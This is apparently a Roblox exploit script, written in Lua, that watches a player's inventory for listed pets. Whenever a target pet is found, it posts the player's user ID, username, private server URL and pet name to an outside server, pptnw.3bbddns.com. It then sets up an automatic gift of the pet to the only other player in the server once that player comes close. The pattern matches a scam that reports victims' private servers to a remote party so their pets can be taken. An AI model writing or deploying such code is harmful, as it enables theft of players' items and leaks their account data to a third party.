task.spawn(function()

    local SERVER_IP = "pptnw.3bbddns.com"
    local SERVER_PORT = 14421
    local HEARTBEAT_INTERVAL = 3

    local HttpService = game:GetService("HttpService")
    local RunService = game:GetService("RunService")
    local GuiService = game:GetService("GuiService")
    local TeleportService = game:GetService("TeleportService")

    local isSystemActive = false
    local lastHeartbeatSent = 0
    local havePET
    local PETTARGET

    local Players = game:GetService("Players")
    local VirtualInputManager = game:GetService("VirtualInputManager")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local camera = workspace.Camera

    local function sendHeartbeat()

        if not (one_click_config and one_click_config.PRIVATESERVER_URL and one_click_config.PRIVATESERVER_URL ~= "" and havePET) then return end

        if not isSystemActive or not LocalPlayer or (tick() - lastHeartbeatSent < HEARTBEAT_INTERVAL) then
            return
        end

        lastHeartbeatSent = tick()
        local userId = LocalPlayer.UserId

        local requestData = {
            Url = string.format("http://%s:%d/heartbeat", SERVER_IP, SERVER_PORT),
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({ userId = userId, username = LocalPlayer.Name, PRIVATESERVER_URL = one_click_config.PRIVATESERVER_URL, havePET = havePET})
        }


        task.spawn(function()
            local success, response = pcall(function()
                return http_request(requestData)
            end)

            if not success then
                warn("Heartbeat System: Critical error calling http_request: " .. tostring(response))
            elseif response and not response.Success then
                warn(string.format("Heartbeat System: Failed to send. Code: %s, Message: %s",
                    tostring(response.StatusCode), tostring(response.StatusMessage)))
            end
        end)
    end

    RunService.Heartbeat:Connect(function()
        sendHeartbeat()
    end)

    local NAME_PET = function(obj)
        if not obj:GetAttribute('PetType') then return end
        return string.match(obj.Name, "^(.-)%s*%[")
    end

    local checkPet = function()
        if not (PETTARGET and PETTARGET.Parent) then
            for _, child in ipairs(LocalPlayer.Backpack:GetChildren()) do
                local np = NAME_PET(child)
                if np and table.find(PetList, np) then
                    isSystemActive = true
                    PETTARGET = child
                    havePET = np
                    return
                end
            end
            local child = LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if child then
                local np = NAME_PET(child)
                if np and table.find(PetList, np) then
                    isSystemActive = true
                    PETTARGET = child
                    havePET = np
                    return
                end
            end
            isSystemActive = false
            PETTARGET = nil
            havePET = nil
        end
    end

    local gift_petlist = {}
    local checktargetpet = function()
        gift_petlist = {}
        for _, p in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if NAME_PET(p) == havePET then
                table.insert(gift_petlist, p)
            end
        end
        local p = LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if p and NAME_PET(p) == havePET then
            table.insert(gift_petlist, p)
        end
        return gift_petlist
    end

    local CamFocus = function(pos)
        local cameraPosition = pos + Vector3.new(0, 15, 0)
        local cameraLookAt = pos
        camera.CameraType = Enum.CameraType.Scriptable
        camera.CFrame = CFrame.new(cameraPosition, cameraLookAt)
    end

    while task.wait(3) do
        pcall(function()

            checkPet()

            if #(Players:GetChildren()) == 1 then return end

            while #checktargetpet() ~= 0 do
                task.wait()
                isSystemActive = false
                pcall(function()
                    for _, pet in ipairs(gift_petlist) do
                        --[[
                        LocalPlayer.Character.Humanoid:EquipTool(pet)
                        if pet:GetAttribute("d") then
                            ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
                        end]]
                        local targetplayer
                        if #(Players:GetChildren()) ~= 2 then return end
                        for _, v in ipairs(Players:GetChildren()) do
                            if LocalPlayer == v then continue end
                            targetplayer = v
                        end
                        if targetplayer and targetplayer:GetAttribute("DataFullyLoaded")
                        and targetplayer:GetAttribute("Finished_Loading")
                        and targetplayer:GetAttribute("Setup_Finished") then
                            local targetHumanoidRootPart = targetplayer.Character.HumanoidRootPart
                            local targetPos = targetHumanoidRootPart.Position
                            if (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude > 10 then return end
                            _G.Settings = {
                                ['USERNAME'] = {
                                    targetplayer.Name
                                },
                                ['PET_SELECT'] = {
                                    havePET
                                }
                            }
                            --[[
                            task.wait(0.25)
                            local prompt = targetHumanoidRootPart and targetplayer.Character.Head:FindFirstChild('ProximityPrompt')
                            if prompt then
                                CamFocus(targetPos)
                                prompt.HoldDuration = 0
                                prompt:InputHoldBegin()
                                prompt:InputHoldEnd()
                                task.wait(2)
                            end]]
                            task.wait(2)
                        end
                    end
                end)
            end

            _G.Settings = {
                ['USERNAME'] = {},
                ['PET_SELECT'] = {}
            }

        end)
    end

end)
